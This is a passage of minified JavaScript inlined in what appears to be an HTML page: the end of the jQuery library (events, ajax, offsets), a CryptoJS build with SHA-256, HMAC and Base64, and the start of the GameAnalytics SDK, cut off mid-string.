i,o,a,s,u,l,c,f,p=[n||E],d=v.call(e,"type")?e.type:e,h=v.call(e,"namespace")?e.namespace.split("."):[];if(o=f=a=n=n||E,3!==n.nodeType&&8!==n.nodeType&&!Tt.test(d+k.event.triggered)&&(-1<d.indexOf(".")&&(d=(h=d.split(".")).shift(),h.sort()),u=d.indexOf(":")<0&&"on"+d,(e=e[k.expando]?e:new k.Event(d,"object"==typeof e&&e)).isTrigger=r?2:3,e.namespace=h.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=n),t=null==t?[e]:k.makeArray(t,[e]),c=k.event.special[d]||{},r||!c.trigger||!1!==c.trigger.apply(n,t))){if(!r&&!c.noBubble&&!x(n)){for(s=c.delegateType||d,Tt.test(s+d)||(o=o.parentNode);o;o=o.parentNode)p.push(o),a=o;a===(n.ownerDocument||E)&&p.push(a.defaultView||a.parentWindow||C)}i=0;while((o=p[i++])&&!e.isPropagationStopped())f=o,e.type=1<i?s:c.bindType||d,(l=(Q.get(o,"events")||{})[e.type]&&Q.get(o,"handle"))&&l.apply(o,t),(l=u&&o[u])&&l.apply&&G(o)&&(e.result=l.apply(o,t),!1===e.result&&e.preventDefault());return e.type=d,r||e.isDefaultPrevented()||c._default&&!1!==c._default.apply(p.pop(),t)||!G(n)||u&&m(n[d])&&!x(n)&&((a=n[u])&&(n[u]=null),k.event.triggered=d,e.isPropagationStopped()&&f.addEventListener(d,Ct),n[d](),e.isPropagationStopped()&&f.removeEventListener(d,Ct),k.event.triggered=void 0,a&&(n[u]=a)),e.result}},simulate:function(e,t,n){var r=k.extend(new k.Event,n,{type:e,isSimulated:!0});k.event.trigger(r,null,t)}}),k.fn.extend({trigger:function(e,t){return this.each(function(){k.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return k.event.trigger(e,t,n,!0)}}),y.focusin||k.each({focus:"focusin",blur:"focusout"},function(n,r){var i=function(e){k.event.simulate(r,e.target,k.event.fix(e))};k.event.special[r]={setup:function(){var e=this.ownerDocument||this,t=Q.access(e,r);t||e.addEventListener(n,i,!0),Q.access(e,r,(t||0)+1)},teardown:function(){var e=this.ownerDocument||this,t=Q.access(e,r)-1;t?Q.access(e,r,t):(e.removeEventListener(n,i,!0),Q.remove(e,r))}}});var Et=C.location,kt=Date.now(),St=/\?/;k.parseXML=function(e){var t;if(!e||"string"!=typeof e)return null;try{t=(new C.DOMParser).parseFromString(e,"text/xml")}catch(e){t=void 0}return t&&!t.getElementsByTagName("parsererror").length||k.error("Invalid XML: "+e),t};var Nt=/\[\]$/,At=/\r?\n/g,Dt=/^(?:submit|button|image|reset|file)$/i,jt=/^(?:input|select|textarea|keygen)/i;function qt(n,e,r,i){var t;if(Array.isArray(e))k.each(e,function(e,t){r||Nt.test(n)?i(n,t):qt(n+"["+("object"==typeof t&&null!=t?e:"")+"]",t,r,i)});else if(r||"object"!==w(e))i(n,e);else for(t in e)qt(n+"["+t+"]",e[t],r,i)}k.param=function(e,t){var n,r=[],i=function(e,t){var n=m(t)?t():t;r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(null==e)return"";if(Array.isArray(e)||e.jquery&&!k.isPlainObject(e))k.each(e,function(){i(this.name,this.value)});else for(n in e)qt(n,e[n],t,i);return r.join("&")},k.fn.extend({serialize:function(){return k.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=k.prop(this,"elements");return e?k.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!k(this).is(":disabled")&&jt.test(this.nodeName)&&!Dt.test(e)&&(this.checked||!pe.test(e))}).map(function(e,t){var n=k(this).val();return null==n?null:Array.isArray(n)?k.map(n,function(e){return{name:t.name,value:e.replace(At,"\r\n")}}):{name:t.name,value:n.replace(At,"\r\n")}}).get()}});var Lt=/%20/g,Ht=/#.*$/,Ot=/([?&])_=[^&]*/,Pt=/^(.*?):[ \t]*([^\r\n]*)$/gm,Rt=/^(?:GET|HEAD)$/,Mt=/^\/\//,It={},Wt={},$t="*/".concat("*"),Ft=E.createElement("a");function Bt(o){return function(e,t){"string"!=typeof e&&(t=e,e="*");var n,r=0,i=e.toLowerCase().match(R)||[];if(m(t))while(n=i[r++])"+"===n[0]?(n=n.slice(1)||"*",(o[n]=o[n]||[]).unshift(t)):(o[n]=o[n]||[]).push(t)}}function _t(t,i,o,a){var s={},u=t===Wt;function l(e){var r;return s[e]=!0,k.each(t[e]||[],function(e,t){var n=t(i,o,a);return"string"!=typeof n||u||s[n]?u?!(r=n):void 0:(i.dataTypes.unshift(n),l(n),!1)}),r}return l(i.dataTypes[0])||!s["*"]&&l("*")}function zt(e,t){var n,r,i=k.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&k.extend(!0,e,r),e}Ft.href=Et.href,k.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Et.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Et.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":$t,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":k.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?zt(zt(e,k.ajaxSettings),t):zt(k.ajaxSettings,e)},ajaxPrefilter:Bt(It),ajaxTransport:Bt(Wt),ajax:function(e,t){"object"==typeof e&&(t=e,e=void 0),t=t||{};var c,f,p,n,d,r,h,g,i,o,v=k.ajaxSetup({},t),y=v.context||v,m=v.context&&(y.nodeType||y.jquery)?k(y):k.event,x=k.Deferred(),b=k.Callbacks("once memory"),w=v.statusCode||{},a={},s={},u="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(h){if(!n){n={};while(t=Pt.exec(p))n[t[1].toLowerCase()+" "]=(n[t[1].toLowerCase()+" "]||[]).concat(t[2])}t=n[e.toLowerCase()+" "]}return null==t?null:t.join(", ")},getAllResponseHeaders:function(){return h?p:null},setRequestHeader:function(e,t){return null==h&&(e=s[e.toLowerCase()]=s[e.toLowerCase()]||e,a[e]=t),this},overrideMimeType:function(e){return null==h&&(v.mimeType=e),this},statusCode:function(e){var t;if(e)if(h)T.always(e[T.status]);else for(t in e)w[t]=[w[t],e[t]];return this},abort:function(e){var t=e||u;return c&&c.abort(t),l(0,t),this}};if(x.promise(T),v.url=((e||v.url||Et.href)+"").replace(Mt,Et.protocol+"//"),v.type=t.method||t.type||v.method||v.type,v.dataTypes=(v.dataType||"*").toLowerCase().match(R)||[""],null==v.crossDomain){r=E.createElement("a");try{r.href=v.url,r.href=r.href,v.crossDomain=Ft.protocol+"//"+Ft.host!=r.protocol+"//"+r.host}catch(e){v.crossDomain=!0}}if(v.data&&v.processData&&"string"!=typeof v.data&&(v.data=k.param(v.data,v.traditional)),_t(It,v,t,T),h)return T;for(i in(g=k.event&&v.global)&&0==k.active++&&k.event.trigger("ajaxStart"),v.type=v.type.toUpperCase(),v.hasContent=!Rt.test(v.type),f=v.url.replace(Ht,""),v.hasContent?v.data&&v.processData&&0===(v.contentType||"").indexOf("application/x-www-form-urlencoded")&&(v.data=v.data.replace(Lt,"+")):(o=v.url.slice(f.length),v.data&&(v.processData||"string"==typeof v.data)&&(f+=(St.test(f)?"&":"?")+v.data,delete v.data),!1===v.cache&&(f=f.replace(Ot,"$1"),o=(St.test(f)?"&":"?")+"_="+kt+++o),v.url=f+o),v.ifModified&&(k.lastModified[f]&&T.setRequestHeader("If-Modified-Since",k.lastModified[f]),k.etag[f]&&T.setRequestHeader("If-None-Match",k.etag[f])),(v.data&&v.hasContent&&!1!==v.contentType||t.contentType)&&T.setRequestHeader("Content-Type",v.contentType),T.setRequestHeader("Accept",v.dataTypes[0]&&v.accepts[v.dataTypes[0]]?v.accepts[v.dataTypes[0]]+("*"!==v.dataTypes[0]?", "+$t+"; q=0.01":""):v.accepts["*"]),v.headers)T.setRequestHeader(i,v.headers[i]);if(v.beforeSend&&(!1===v.beforeSend.call(y,T,v)||h))return T.abort();if(u="abort",b.add(v.complete),T.done(v.success),T.fail(v.error),c=_t(Wt,v,t,T)){if(T.readyState=1,g&&m.trigger("ajaxSend",[T,v]),h)return T;v.async&&0<v.timeout&&(d=C.setTimeout(function(){T.abort("timeout")},v.timeout));try{h=!1,c.send(a,l)}catch(e){if(h)throw e;l(-1,e)}}else l(-1,"No Transport");function l(e,t,n,r){var i,o,a,s,u,l=t;h||(h=!0,d&&C.clearTimeout(d),c=void 0,p=r||"",T.readyState=0<e?4:0,i=200<=e&&e<300||304===e,n&&(s=function(e,t,n){var r,i,o,a,s=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in s)if(s[i]&&s[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}a||(a=i)}o=o||a}if(o)return o!==u[0]&&u.unshift(o),n[o]}(v,T,n)),s=function(e,t,n,r){var i,o,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(!(a=l[u+" "+o]||l["* "+o]))for(i in l)if((s=i.split(" "))[1]===o&&(a=l[u+" "+s[0]]||l["* "+s[0]])){!0===a?a=l[i]:!0!==l[i]&&(o=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}(v,s,T,i),i?(v.ifModified&&((u=T.getResponseHeader("Last-Modified"))&&(k.lastModified[f]=u),(u=T.getResponseHeader("etag"))&&(k.etag[f]=u)),204===e||"HEAD"===v.type?l="nocontent":304===e?l="notmodified":(l=s.state,o=s.data,i=!(a=s.error))):(a=l,!e&&l||(l="error",e<0&&(e=0))),T.status=e,T.statusText=(t||l)+"",i?x.resolveWith(y,[o,l,T]):x.rejectWith(y,[T,l,a]),T.statusCode(w),w=void 0,g&&m.trigger(i?"ajaxSuccess":"ajaxError",[T,v,i?o:a]),b.fireWith(y,[T,l]),g&&(m.trigger("ajaxComplete",[T,v]),--k.active||k.event.trigger("ajaxStop")))}return T},getJSON:function(e,t,n){return k.get(e,t,n,"json")},getScript:function(e,t){return k.get(e,void 0,t,"script")}}),k.each(["get","post"],function(e,i){k[i]=function(e,t,n,r){return m(t)&&(r=r||n,n=t,t=void 0),k.ajax(k.extend({url:e,type:i,dataType:r,data:t,success:n},k.isPlainObject(e)&&e))}}),k._evalUrl=function(e,t){return k.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,converters:{"text script":function(){}},dataFilter:function(e){k.globalEval(e,t)}})},k.fn.extend({wrapAll:function(e){var t;return this[0]&&(m(e)&&(e=e.call(this[0])),t=k(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(n){return m(n)?this.each(function(e){k(this).wrapInner(n.call(this,e))}):this.each(function(){var e=k(this),t=e.contents();t.length?t.wrapAll(n):e.append(n)})},wrap:function(t){var n=m(t);return this.each(function(e){k(this).wrapAll(n?t.call(this,e):t)})},unwrap:function(e){return this.parent(e).not("body").each(function(){k(this).replaceWith(this.childNodes)}),this}}),k.expr.pseudos.hidden=function(e){return!k.expr.pseudos.visible(e)},k.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},k.ajaxSettings.xhr=function(){try{return new C.XMLHttpRequest}catch(e){}};var Ut={0:200,1223:204},Xt=k.ajaxSettings.xhr();y.cors=!!Xt&&"withCredentials"in Xt,y.ajax=Xt=!!Xt,k.ajaxTransport(function(i){var o,a;if(y.cors||Xt&&!i.crossDomain)return{send:function(e,t){var n,r=i.xhr();if(r.open(i.type,i.url,i.async,i.username,i.password),i.xhrFields)for(n in i.xhrFields)r[n]=i.xhrFields[n];for(n in i.mimeType&&r.overrideMimeType&&r.overrideMimeType(i.mimeType),i.crossDomain||e["X-Requested-With"]||(e["X-Requested-With"]="XMLHttpRequest"),e)r.setRequestHeader(n,e[n]);o=function(e){return function(){o&&(o=a=r.onload=r.onerror=r.onabort=r.ontimeout=r.onreadystatechange=null,"abort"===e?r.abort():"error"===e?"number"!=typeof r.status?t(0,"error"):t(r.status,r.statusText):t(Ut[r.status]||r.status,r.statusText,"text"!==(r.responseType||"text")||"string"!=typeof r.responseText?{binary:r.response}:{text:r.responseText},r.getAllResponseHeaders()))}},r.onload=o(),a=r.onerror=r.ontimeout=o("error"),void 0!==r.onabort?r.onabort=a:r.onreadystatechange=function(){4===r.readyState&&C.setTimeout(function(){o&&a()})},o=o("abort");try{r.send(i.hasContent&&i.data||null)}catch(e){if(o)throw e}},abort:function(){o&&o()}}}),k.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),k.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return k.globalEval(e),e}}}),k.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),k.ajaxTransport("script",function(n){var r,i;if(n.crossDomain||n.scriptAttrs)return{send:function(e,t){r=k("<script>").attr(n.scriptAttrs||{}).prop({charset:n.scriptCharset,src:n.url}).on("load error",i=function(e){r.remove(),i=null,e&&t("error"===e.type?404:200,e.type)}),E.head.appendChild(r[0])},abort:function(){i&&i()}}});var Vt,Gt=[],Yt=/(=)\?(?=&|$)|\?\?/;k.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Gt.pop()||k.expando+"_"+kt++;return this[e]=!0,e}}),k.ajaxPrefilter("json jsonp",function(e,t,n){var r,i,o,a=!1!==e.jsonp&&(Yt.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Yt.test(e.data)&&"data");if(a||"jsonp"===e.dataTypes[0])return r=e.jsonpCallback=m(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(Yt,"$1"+r):!1!==e.jsonp&&(e.url+=(St.test(e.url)?"&":"?")+e.jsonp+"="+r),e.converters["script json"]=function(){return o||k.error(r+" was not called"),o[0]},e.dataTypes[0]="json",i=C[r],C[r]=function(){o=arguments},n.always(function(){void 0===i?k(C).removeProp(r):C[r]=i,e[r]&&(e.jsonpCallback=t.jsonpCallback,Gt.push(r)),o&&m(i)&&i(o[0]),o=i=void 0}),"script"}),y.createHTMLDocument=((Vt=E.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===Vt.childNodes.length),k.parseHTML=function(e,t,n){return"string"!=typeof e?[]:("boolean"==typeof t&&(n=t,t=!1),t||(y.createHTMLDocument?((r=(t=E.implementation.createHTMLDocument("")).createElement("base")).href=E.location.href,t.head.appendChild(r)):t=E),o=!n&&[],(i=D.exec(e))?[t.createElement(i[1])]:(i=we([e],t,o),o&&o.length&&k(o).remove(),k.merge([],i.childNodes)));var r,i,o},k.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return-1<s&&(r=mt(e.slice(s)),e=e.slice(0,s)),m(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),0<a.length&&k.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?k("<div>").append(k.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},k.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){k.fn[t]=function(e){return this.on(t,e)}}),k.expr.pseudos.animated=function(t){return k.grep(k.timers,function(e){return t===e.elem}).length},k.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l=k.css(e,"position"),c=k(e),f={};"static"===l&&(e.style.position="relative"),s=c.offset(),o=k.css(e,"top"),u=k.css(e,"left"),("absolute"===l||"fixed"===l)&&-1<(o+u).indexOf("auto")?(a=(r=c.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),m(t)&&(t=t.call(e,n,k.extend({},s))),null!=t.top&&(f.top=t.top-s.top+a),null!=t.left&&(f.left=t.left-s.left+i),"using"in t?t.using.call(e,f):c.css(f)}},k.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each(function(e){k.offset.setOffset(this,t,e)});var e,n,r=this[0];return r?r.getClientRects().length?(e=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===k.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===k.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=k(e).offset()).top+=k.css(e,"borderTopWidth",!0),i.left+=k.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-k.css(r,"marginTop",!0),left:t.left-i.left-k.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===k.css(e,"position"))e=e.offsetParent;return e||ie})}}),k.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,i){var o="pageYOffset"===i;k.fn[t]=function(e){return _(this,function(e,t,n){var r;if(x(e)?r=e:9===e.nodeType&&(r=e.defaultView),void 0===n)return r?r[i]:e[t];r?r.scrollTo(o?r.pageXOffset:n,o?n:r.pageYOffset):e[t]=n},t,e,arguments.length)}}),k.each(["top","left"],function(e,n){k.cssHooks[n]=ze(y.pixelPosition,function(e,t){if(t)return t=_e(e,n),$e.test(t)?k(e).position()[n]+"px":t})}),k.each({Height:"height",Width:"width"},function(a,s){k.each({padding:"inner"+a,content:s,"":"outer"+a},function(r,o){k.fn[o]=function(e,t){var n=arguments.length&&(r||"boolean"!=typeof e),i=r||(!0===e||!0===t?"margin":"border");return _(this,function(e,t,n){var r;return x(e)?0===o.indexOf("outer")?e["inner"+a]:e.document.documentElement["client"+a]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+a],r["scroll"+a],e.body["offset"+a],r["offset"+a],r["client"+a])):void 0===n?k.css(e,t,i):k.style(e,t,n,i)},s,n?e:void 0,n)}})}),k.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,n){k.fn[n]=function(e,t){return 0<arguments.length?this.on(n,null,e,t):this.trigger(n)}}),k.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),k.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}}),k.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),m(e))return r=s.call(arguments,2),(i=function(){return e.apply(t||this,r.concat(s.call(arguments)))}).guid=e.guid=e.guid||k.guid++,i},k.holdReady=function(e){e?k.readyWait++:k.ready(!0)},k.isArray=Array.isArray,k.parseJSON=JSON.parse,k.nodeName=A,k.isFunction=m,k.isWindow=x,k.camelCase=V,k.type=w,k.now=Date.now,k.isNumeric=function(e){var t=k.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},"function"==typeof define&&define.amd&&define("jquery",[],function(){return k});var Qt=C.jQuery,Jt=C.$;return k.noConflict=function(e){return C.$===k&&(C.$=Jt),e&&C.jQuery===k&&(C.jQuery=Qt),k},e||(C.jQuery=C.$=k),k});
</script>

	<script>(function(scope){
var CryptoJS=CryptoJS||function(e,n){var t={},i=t.lib={},r=function(){},s=i.Base={extend:function(e){r.prototype=this;var n=new r;return e&&n.mixIn(e),n.hasOwnProperty("init")||(n.init=function(){n.$super.init.apply(this,arguments)}),n.init.prototype=n,n.$super=this,n},create:function(){var e=this.extend();return e.init.apply(e,arguments),e},init:function(){},mixIn:function(e){for(var n in e)e.hasOwnProperty(n)&&(this[n]=e[n]);e.hasOwnProperty("toString")&&(this.toString=e.toString)},clone:function(){return this.init.prototype.extend(this)}},o=i.WordArray=s.extend({init:function(e,n){e=this.words=e||[],this.sigBytes=void 0!=n?n:4*e.length},toString:function(e){return(e||u).stringify(this)},concat:function(e){var n=this.words,t=e.words,i=this.sigBytes;if(e=e.sigBytes,this.clamp(),i%4)for(var r=0;r<e;r++)n[i+r>>>2]|=(t[r>>>2]>>>24-r%4*8&255)<<24-(i+r)%4*8;else if(65535<t.length)for(r=0;r<e;r+=4)n[i+r>>>2]=t[r>>>2];else n.push.apply(n,t);return this.sigBytes+=e,this},clamp:function(){var n=this.words,t=this.sigBytes;n[t>>>2]&=4294967295<<32-t%4*8,n.length=e.ceil(t/4)},clone:function(){var e=s.clone.call(this);return e.words=this.words.slice(0),e},random:function(n){for(var t=[],i=0;i<n;i+=4)t.push(4294967296*e.random()|0);return new o.init(t,n)}}),a=t.enc={},u=a.Hex={stringify:function(e){var n=e.words;e=e.sigBytes;for(var t=[],i=0;i<e;i++){var r=n[i>>>2]>>>24-i%4*8&255;t.push((r>>>4).toString(16)),t.push((15&r).toString(16))}return t.join("")},parse:function(e){for(var n=e.length,t=[],i=0;i<n;i+=2)t[i>>>3]|=parseInt(e.substr(i,2),16)<<24-i%8*4;return new o.init(t,n/2)}},c=a.Latin1={stringify:function(e){var n=e.words;e=e.sigBytes;for(var t=[],i=0;i<e;i++)t.push(String.fromCharCode(n[i>>>2]>>>24-i%4*8&255));return t.join("")},parse:function(e){for(var n=e.length,t=[],i=0;i<n;i++)t[i>>>2]|=(255&e.charCodeAt(i))<<24-i%4*8;return new o.init(t,n)}},d=a.Utf8={stringify:function(e){try{return decodeURIComponent(escape(c.stringify(e)))}catch(e){throw Error("Malformed UTF-8 data")}},parse:function(e){return c.parse(unescape(encodeURIComponent(e)))}},l=i.BufferedBlockAlgorithm=s.extend({reset:function(){this._data=new o.init,this._nDataBytes=0},_append:function(e){"string"==typeof e&&(e=d.parse(e)),this._data.concat(e),this._nDataBytes+=e.sigBytes},_process:function(n){var t=this._data,i=t.words,r=t.sigBytes,s=this.blockSize,a=r/(4*s),a=n?e.ceil(a):e.max((0|a)-this._minBufferSize,0);if(n=a*s,r=e.min(4*n,r),n){for(var u=0;u<n;u+=s)this._doProcessBlock(i,u);u=i.splice(0,n),t.sigBytes-=r}return new o.init(u,r)},clone:function(){var e=s.clone.call(this);return e._data=this._data.clone(),e},_minBufferSize:0});i.Hasher=l.extend({cfg:s.extend(),init:function(e){this.cfg=this.cfg.extend(e),this.reset()},reset:function(){l.reset.call(this),this._doReset()},update:function(e){return this._append(e),this._process(),this},finalize:function(e){return e&&this._append(e),this._doFinalize()},blockSize:16,_createHelper:function(e){return function(n,t){return new e.init(t).finalize(n)}},_createHmacHelper:function(e){return function(n,t){return new f.HMAC.init(e,t).finalize(n)}}});var f=t.algo={};return t}(Math);!function(e){for(var n=CryptoJS,t=n.lib,i=t.WordArray,r=t.Hasher,t=n.algo,s=[],o=[],a=function(e){return 4294967296*(e-(0|e))|0},u=2,c=0;64>c;){var d;e:{d=u;for(var l=e.sqrt(d),f=2;f<=l;f++)if(!(d%f)){d=!1;break e}d=!0}d&&(8>c&&(s[c]=a(e.pow(u,.5))),o[c]=a(e.pow(u,1/3)),c++),u++}var v=[],t=t.SHA256=r.extend({_doReset:function(){this._hash=new i.init(s.slice(0))},_doProcessBlock:function(e,n){for(var t=this._hash.words,i=t[0],r=t[1],s=t[2],a=t[3],u=t[4],c=t[5],d=t[6],l=t[7],f=0;64>f;f++){if(16>f)v[f]=0|e[n+f];else{var g=v[f-15],m=v[f-2];v[f]=((g<<25|g>>>7)^(g<<14|g>>>18)^g>>>3)+v[f-7]+((m<<15|m>>>17)^(m<<13|m>>>19)^m>>>10)+v[f-16]}g=l+((u<<26|u>>>6)^(u<<21|u>>>11)^(u<<7|u>>>25))+(u&c^~u&d)+o[f]+v[f],m=((i<<30|i>>>2)^(i<<19|i>>>13)^(i<<10|i>>>22))+(i&r^i&s^r&s),l=d,d=c,c=u,u=a+g|0,a=s,s=r,r=i,i=g+m|0}t[0]=t[0]+i|0,t[1]=t[1]+r|0,t[2]=t[2]+s|0,t[3]=t[3]+a|0,t[4]=t[4]+u|0,t[5]=t[5]+c|0,t[6]=t[6]+d|0,t[7]=t[7]+l|0},_doFinalize:function(){var n=this._data,t=n.words,i=8*this._nDataBytes,r=8*n.sigBytes;return t[r>>>5]|=128<<24-r%32,t[14+(r+64>>>9<<4)]=e.floor(i/4294967296),t[15+(r+64>>>9<<4)]=i,n.sigBytes=4*t.length,this._process(),this._hash},clone:function(){var e=r.clone.call(this);return e._hash=this._hash.clone(),e}});n.SHA256=r._createHelper(t),n.HmacSHA256=r._createHmacHelper(t)}(Math),function(){var e=CryptoJS,n=e.enc.Utf8;e.algo.HMAC=e.lib.Base.extend({init:function(e,t){e=this._hasher=new e.init,"string"==typeof t&&(t=n.parse(t));var i=e.blockSize,r=4*i;t.sigBytes>r&&(t=e.finalize(t)),t.clamp();for(var s=this._oKey=t.clone(),o=this._iKey=t.clone(),a=s.words,u=o.words,c=0;c<i;c++)a[c]^=1549556828,u[c]^=909522486;s.sigBytes=o.sigBytes=r,this.reset()},reset:function(){var e=this._hasher;e.reset(),e.update(this._iKey)},update:function(e){return this._hasher.update(e),this},finalize:function(e){var n=this._hasher;return e=n.finalize(e),n.reset(),n.finalize(this._oKey.clone().concat(e))}})}(),function(){var e=CryptoJS,n=e.lib.WordArray;e.enc.Base64={stringify:function(e){var n=e.words,t=e.sigBytes,i=this._map;e.clamp(),e=[];for(var r=0;r<t;r+=3)for(var s=(n[r>>>2]>>>24-r%4*8&255)<<16|(n[r+1>>>2]>>>24-(r+1)%4*8&255)<<8|n[r+2>>>2]>>>24-(r+2)%4*8&255,o=0;4>o&&r+.75*o<t;o++)e.push(i.charAt(s>>>6*(3-o)&63));if(n=i.charAt(64))for(;e.length%4;)e.push(n);return e.join("")},parse:function(e){var t=e.length,i=this._map,r=i.charAt(64);r&&-1!=(r=e.indexOf(r))&&(t=r);for(var r=[],s=0,o=0;o<t;o++)if(o%4){var a=i.indexOf(e.charAt(o-1))<<o%4*2,u=i.indexOf(e.charAt(o))>>>6-o%4*2;r[s>>>2]|=(a|u)<<24-s%4*8,s++}return n.create(r,s)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="}}();var gameanalytics;!function(e){!function(e){e[e.Undefined=0]="Undefined",e[e.Debug=1]="Debug",e[e.Info=2]="Info",e[e.Warning=3]="Warning",e[e.Error=4]="Error",e[e.Critical=5]="Critical"}(e.EGAErrorSeverity||(e.EGAErrorSeverity={}));!function(e){e[e.Undefined=0]="Undefined",e[e.Male=1]="Male",e[e.Female=2]="Female"}(e.EGAGender||(e.EGAGender={}));!function(e){e[e.Undefined=0]="Undefined",e[e.Start=1]="Start",e[e.Complete=2]="Complete",e[e.Fail=3]="Fail"}(e.EGAProgressionStatus||(e.EGAProgressionStatus={}));!function(e){e[e.Undefined=0]="Undefined",e[e.Source=1]="Source",e[e.Sink=2]="Sink"}(e.EGAResourceFlowType||(e.EGAResourceFlowType={}));!function(e){!function(e){e[e.Undefined=0]="Undefined",e[e.Rejected=1]="Rejected"}(e.EGASdkErrorType||(e.EGASdkErrorType={}));!function(e){e[e.NoResponse=0]="NoResponse",e[e.BadResponse=1]="BadResponse",e[e.RequestTimeout=2]="RequestTimeout",e[e.JsonEncodeFailed=3]="JsonEncodeFailed",e[e.JsonDecodeFailed=4]="JsonDecodeFailed",e[e.InternalServerError=5]="InternalServerError",e[e.BadRequest=6]="BadRequest",e[e.Unauthorized=7]="Unauthorized",e[e.UnknownResponseCode=8]="UnknownResponseCode",e[e.Ok=9]="Ok"}(e.EGAHTTPApiResponse||(e.EGAHTTPApiResponse={}))}(e.http||(e.http={}))}(gameanalytics||(gameanalytics={}));var EGAErrorSeverity=gameanalytics.EGAErrorSeverity,EGAGender=gameanalytics.EGAGender,EGAProgressionStatus=gameanalytics.EGAProgressionStatus,EGAResourceFlowType=gameanalytics.EGAResourceFlowType,gameanalytics;!function(e){!function(e){var n;!function(e){e[e.Error=0]="Error",e[e.Warning=1]="Warning",e[e.Info=2]="Info",e[e.Debug=3]="Debug"}(n||(n={}));var t=function(){function e(){e.debugEnabled=!1}return e.setInfoLog=function(n){e.instance.infoLogEnabled=n},e.setVerboseLog=function(n){e.instance.infoLogVerboseEnabled=n},e.i=function(t){if(e.instance.infoLogEnabled){var i="Info/"+e.Tag+": "+t;e.instance.sendNotificationMessage(i,n.Info)}},e.w=function(t){var i="Warning/"+e.Tag+": 